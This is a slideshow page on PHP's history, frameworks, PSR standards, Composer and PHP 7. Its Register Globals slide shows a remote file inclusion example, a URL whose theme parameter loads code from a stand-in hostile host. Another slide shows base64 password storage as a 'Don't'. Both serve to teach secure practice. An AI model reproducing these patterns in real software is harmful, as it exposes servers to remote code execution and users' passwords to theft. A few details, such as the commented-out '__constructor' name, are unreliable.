---
layout: default
subtitle: We Can Dance If We Want To
---

<section>
    <img data-src="so_beautiful_inverted.png" class="logo">
    <img data-src="magic-php.gif">
    <div>
    <ul>
        <li><a href="#/a-history-of-php">A History of PHP</a></li>
        <li><a href="#/frameworks-and-interoperability">Frameworks and Interoperability</a></li>
        <li><a href="#/php-7">And Now, PHP 7</a></li>
    </ul>
    </div>
</section>

<section id="a-history-of-php">
    <h2>A History of PHP</h2>
</section>

<section>

    <h2>Origins</h2>

    <section>
        <p>PHP started many years ago as a way to add some flexibility to HTML files.</p>

        <p>It grew in fits and starts into a fully-fledged programming language.</p>
    </section>

    <section>
        <p>This evolution of the language was uniquely centered around HTML and the World Wide Web.</p>

        <p>However, as with actual evolution, things got messy.</p>
    </section>

    <section>

        <p>The most common criticisms of PHP over the years have been the seemingly-unending security problems ... and the random "needle"/"haystack" parameter order.</p>

        <p>Another valid concern that arose from messy evolution is that PHP lacked a representation of <strong>Requests</strong> and <strong>Responses</strong>.</p>

    </section>

    <section>

        <p>For PHP, <strong>each execution</strong> of the script is a Request - and the script's output is the Response.</p>

        <p>This has led to some sloppy practices on the part of developers.</p>

    </section>

    <section>

        <p>Languages that were introduced to web development later on were able to intentionally abstract the Request/Response concept.</p>

        <p>Not only because they had more time to learn patterns that make it easier to work with the Web, but also because they were designed to be long-running and handle multiple requests.</p>

    </section>

</section>

<section>
    <h2>Into the Badlands</h2>
</section>

<section>
    <h2>Register Globals</h2>

    <section>
    <p>What was so bad about early PHP, you wonder?</p>

    <p>One of the most egregious issues was known as Register Globals.</p>

    <p>This was a setting that allowed <strong>raw, unfiltered query parameters</strong> to exist as variables within the scope of the script.</p>
    </section>

    <section>
        <p>It was very convenient, which made it popular at first.</p>

        <p><em>(Which, really, is PHP in a nutshell)</em></p>
	<pre><code data-trim>
        // URL being requested:
        // http://example.com/index.php?name=Watson

        // Entire contents of index.php:
        &lt;html>&lt;body>Hello, &lt;?php echo $name; ?>&lt;/body>&lt;/html>
    </code></pre>
    </section>

    <section>
        <p>Unfortunately, it was a huge cause of security issues.</p>

        <p><em>(Which, really, is PHP in a nutshell)</em></p>

        <pre><code data-trim>
        // index.php:
        &lt;?php
        require "$theme/header.php";
        ?>
        &lt;h1>Welcome, &lt;?php echo $name; ?>!&lt;/h1>

        // URL being requested:
        // http://example.com/index.php?name=Watson
        //     &theme=http%3A%2F%2Fhostile.example.com%2Fhostile.js%3F
    </code></pre>
    </section>

    <section>
        <h3>RIP Register Globals</h3>
        <p>1995-2002</p>
        <br>
        <p><em>Well, at least it no longer defaulted to "on".</em></p>
    </section>

    <section>
        <h3>RIP Register Globals</h3>
        <p>1995-<strong>2012</strong></p>
        <br>
        <p><strong>For Real.</strong></p>
    </section>
</section>

<section>
    <h2>Needles and Haystacks</h2>

    <section>
        <p>PHP seems to have some disagreement between whether the "Needle" or the "Haystack" should come first in function parameters.</p>

        <p>For some reason this has made certain people seriously upset with the language.</p>
    </section>
    <section>
        <p>strpos(<em>$haystack, $needle</em>)</p>
        <p>strstr(<em>$haystack, $needle</em>)</p>
        <p>implode(<em>$glue, $pieces</em>)</p>
    </section>
    <section>
        <p>And yet ...</p>
    </section>
    <section>
        <p>in_array(<em>$needle, $haystack</em>)</p>
        <p>array_search(<em>$needle, $haystack</em>)</p>
        <p>array_key_exists(<em>$key, $array</em>)</p>
        <p>implode(<em>$pieces, $glue</em>)</p>
    </section>
    <section>
        <p>implode(<em>$glue, $pieces</em>)</p>

        <p>implode(<em>$pieces, $glue</em>)</p>
        <br>
        <p>... for "historical reasons".</p>
    </section>

    <section>
        <p>explode(<em>$delimiter, $string</em>)</p>

        <p style="text-decoration: line-through;">explode(<em>$string, $delimiter</em>)</p>
        <br>
        <p>... because "**** you", that's why.</p>
        <p><small>(Actually, it's for practical reasons: the parameter signatures can't be differentiated.)</small></p>
    </section>
</section>

{#
<section>
    <h2>Confusing Constructors</h2>

    <section>
        <p>PHP 3 and PHP 4 introduced Java-like classes.</p>

        <p>However, the way constructors were handled was not consistent or ideal.</p>

        &lt;?php

        class MyClass {
            function MyClass() {
                // this is actually my constructor
            }
        }

    </section>
    <section>

        <p>Thankfully, this has been modernized:</p>

        &lt;?php

        namespace MyApp;

        class MyClass {
            public function __constructor() {
                // this is my constructor
            }
        }

    </section>
</section>
#}

<section>
    <h2>Weird Objects</h2>

    <p>In some early versions of PHP, objects were implicitly cloned when a developer might reasonably expect it to be copied by reference.</p>

    <p>This meant that, on occasion, developers would have to force copy-by-reference with `$var =& $obj;`.</p>

    <p>PHP resolved the ambiguity from version 4 and onward.</p>
</section>

<section>
    <h2>Bad Password Handling</h2>

    <section>
        <p>Passwords must be handled with care. But PHP developers often didn't know the best way to do this.</p>
        <p>Some of the most attrocious password storage mechanisms were "invented" by PHP developers who rolled their own solutions without having any help or even knowing there was a problem.</p>
        <p><strong>Don't:</strong></p>
        <p><pre>
        $password = base64_encode($password);
        </pre></p>
    </section>

    <section>
        <p>PHP 5.5 to the Rescue!</p>
        <p><strong>Do: </strong></p>
        <p><pre>
        $hash = password_hash(
            $password,
            PASSWORD_BCRYPT,
            ['cost' => 12]
        );
        </pre></p>
    </section>
</section>

<section>
    <h2>Non-Standard Request Processing</h2>

    <section>
        <p>Exposing request values via special "Super-Global" variables led to some issues that could have been solved by a core Request/Response abstraction.</p>
        <p>It is a constant source of Spooky Action at a Distance and other side effects.</p>
    </section>

</section>

<section id="frameworks-and-interoperability">
    <h2>Enter: The Frameworks</h2>
</section>

<section>
    <h2>Dawn of the Frameworks</h2>

    <section>
        <p>It was a primordial time, but there was light at the end of the tunnel.</p>

        <p>Seeing the lack of useful abstractions in PHP development, the community rallied and created Frameworks.</p>
    </section>

    <section>
        <p>So. Many. Frameworks.</p>

        <p>Cake, CodeIgniter, Drupal, eZ, Fuel, Joomla, Kohana, Laravel, Lumen, Midgard, Moodle, Nette, Phalcon, Silex, SilverStripe, Slim, Symfony, TYPO3, Yii, WordPress, Zend</p>
    </section>

    <section>
        <p>They really did help make it more tolerable to program with PHP.</p>

        <p>But there was pushback to the idea of frameworks foisting rigid constraints on applications.</p>

        <p>And the competition between frameworks pushed developers to specialize instead of collaborate.</p>
    </section>

    <section>
        <p>Each framework had their own way of doing:</p>
        <ul>
            <li>Requests</li>
            <li>Responses</li>
            <li>Form Processing</li>
            <li>Authentication</li>
            <li>Caching</li>
            <li>Logging</li>
            <li>... and everything else.</li>
        </ul>
    </section>

    <section>
        <p>In short, the PHP landscape had turned into a gigantic factory for re-inventing wheels.</p>
    </section>
</section>

<section>
    <h2>Interoperability</h2>
</section>

<section>
    <h2>PEAR</h2>

    <section>
        <p>PEAR provided the first collection of reusable libraries for PHP projects.</p>
        <p>It was designed for a more primeval time, and a completely different web development landscape than exists today.</p>
    </section>
</section>

<section>
    <h2>PHP FIG</h2>

    <section>
        <p>The Framework Interoperability Group is a group of PHP frameworks whose representatives consciously find ways to help frameworks work together.</p>
        <p>Their goal is to make it nearly unnecessary to re-invent wheels, and also to make it easier to use re-invented wheels when it is truly necessary.</p>
    </section>

    <section>
        <p>When the FIG ratifies a PHP Standard Recommendation (PSR), this carries a lot of weight in the framework community.</p>

        <p>The first standard, <strong>PSR-0</strong>, helped revolutionize application development in PHP and made it possible for Composer to replace PEAR.</p>
    </section>

    <section>
        <p>Subsequent PSRs included:</p>
        <ul>
            <li>PSR-1: Basic Coding Standard</li>
            <li>PSR-2: Coding Style Guide</li>
            <li>PSR-3: Logger Interface</li>
            <li>PSR-4: New Autoloader Standard</li>
            <li>PSR-6: Caching Interface</li>
            <li>PSR-7: HTTP Message Interface</li>
        </ul>
    </section>

    <section>
        <p>And also:</p>
        <ul>
            <li>PSR-11: Container Interface</li>
            <li>PSR-13: Hypermedia Links</li>
            <li>PSR-15: HTTP Handlers</li>
            <li>PSR-16: Simple Cache</li>
        </ul>
    </section>

    <section>
        <p>Allowing code to operate on common interfaces enables frameworks and libraries to build
            solid foundations that can be relied upon across PHP projects.</p>
    </section>
</section>

<section>
    <h2>Composer and Packagist</h2>
</section>

<section>
    <h2>Composer</h2>

    <section>
        <p>Composer came onto the PHP scene in 2011, and took the community by storm.</p>

        <p>Finally, PHP projects had an easy way to track their dependencies and quickly fetch and integrate new libraries with a single command.</p>
    </section>

    <section>
        <p>Say you wanted to access Amazon AWS APIs:</p>

        <p><pre>composer require aws/aws-sdk-php</pre></p>

        <p>And then it's ready for you to configure and use in your application.</p>
    </section>
</section>

<section>
    <h2>Packagist</h2>

    <section>
        <p>Packagist is the de facto package repository for PHP and Composer.</p>

        <p>If it's not on packagist, you can still install it using composer, but the steps are a bit harder.</p>
    </section>
</section>

<section>
    <h2>The Right Way</h2>
    <p><a href="https://www.phptherightway.com/">PHP The Right Way</a> is a comprehensive community effort to document modern PHP practices.</p>
    <p>If your only experience with PHP was a janky mess built in PHP 3, definitely check out PHP The Right Way to see how the PHP world has changed.</p>
</section>

<section id="php-7">
    <h2>PHP 7</h2>
</section>

<section>
    <h2>PHP 7</h2>

    <section>
        <p>The new language features in PHP 7 are fantastic, but one of the great things about version 7 has been the massive push to get the whole Internet upgraded.</p>
        <p>Let PHP 5 die. Kill it, if you have to.</p>
    </section>

    <section>
        <p>We want to avoid a situation like exists with Python 2/3 and Perl 5/6, where two separate versions of the language are being actively used.</p>

        <p>There is one direction for PHP, and it is Forward.</p>
    </section>
</section>
<section>
    <h3>RIP EXT-MySQL</h3>

    <p>Ding, Dong, the MySQL extension is gone!</p>

    <p>Noted for basically encouraging developers to create massive SQL Injection vulnerabilities instead of applications, this extension has now gone the way of the Dodo.</p>

    <p>Its successor, PDO, encourages safer database usage with prepared statements and parameter binding.</p>
</section>

<section>
    <h3>Object Oriented</h3>

    <p>Much modern PHP code is object-oriented.</p>

    <p>Proven concepts like SOLID and unit testing are employed to ensure quality software engineering practices are being followed.</p>
</section>

<section>
    <h3>Functional</h3>

    <p>Modern PHP also supports Functional Programming concepts.</p>

    <p>Ideas like Map/Reduce have been supported for a while, but callable anonymous functions and anonymous classes are making it even easier to apply the functional programming approach to PHP projects.</p>
</section>

<section>
    <h3>Fast</h3>

    <p>PHP 7 is fast.</p>

    <p>Many companies have been posting about big speed improvements under PHP 7.</p>

    <p>This will also continue to improve on a framework level, as profiling technologies like Blackfire and Tideways make it into everyday development practices.</p>
</section>

<section>
    <h3>Type Safe (ish)</h3>

    <p>PHP 5's type "hints" have been upgraded to <strong>Type Declarations</strong>.</p>

    <p>Type safety will help developers write safer and more reliable code in PHP.</p>

    <p>PHP 7 supports type declarations for both Objects and Scalars. These declarations can be used for method parameters, and for <strong>return types</strong>.</p>
</section>

<section>
    <h3>Testable</h3>

    <p>PHP has plenty of tools for automated testing and code analysis, to ensure your code is safe and well-engineered.</p>

    <p>PHPUnit, Codeception, PHPSpec, PHPStan, Infection, and more.</p>
</section>

<section>
    <h3>Debuggable</h3>

    <p>XDebug is the primary way to do breakpoint debugging and code coverage analysis in PHP.</p>

    <p>PHP 7 also introduces a new "Error" class of Exception, which allows you to capture all kinds of errors that previously would've resulted in the process ending.</p>
</section>

<section>
    <h3>Ideas Welcome</h3>
    <p>Have you spotted an error, or an area that would benefit from improvement?</p>
    <p>Do you have juicy examples of PHP horror-story code that has been completely cleaned up after applying modern PHP practices?</p>
    <p>File an issue or PR on <a href="https://github.com/beryllium/beautifulphp">the BeautifulPHP GitHub Repository</a>!</p>
</section>

<section>
    <h3>About the Author</h3>
    <p>BeautifulPHP is the creation of Kevin Boyd (aka "Beryllium"), a PHP developer for over 15 years.</p>
    <ul>
        <li><strong>Tech Blog: </strong> <a href="https://whateverthing.com/">https://whateverthing.com/</a></li>
        <li><strong>Photo Blog: </strong> <a href="https://www.kevinboyd.ca/">https://www.kevinboyd.ca/</a></li>
        <li><strong>Twitter: </strong> <a href="https://twitter.com/Beryllium9">@Beryllium9</a> <a href="https://twitter.com/beryllium9?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-show-screen-name="false" data-show-count="false" data-dnt="true">Follow @beryllium9</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></li>
        <li><strong>GitHub: </strong> <a href="https://github.com/beryllium">@beryllium</a></li>
        <li><strong>E-mail: </strong> <a href="mailto:me+beautifulphp@kevinboyd.ca">me@kevinboyd.ca</a></li>
    </ul>
</section>

<section>
    <h3>Spread the word!</h3>
    <p>Tell the world about BeautifulPHP</p>
    <p><a href="https://twitter.com/intent/tweet?button_hashtag=BeautifulPHP&ref_src=twsrc%5Etfw" class="twitter-hashtag-button" data-size="large" data-text="I just checked out the slideshow at" data-url="https://beautifulphp.com/" data-dnt="true" data-show-count="false">Tweet #BeautifulPHP</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></p>
</section>
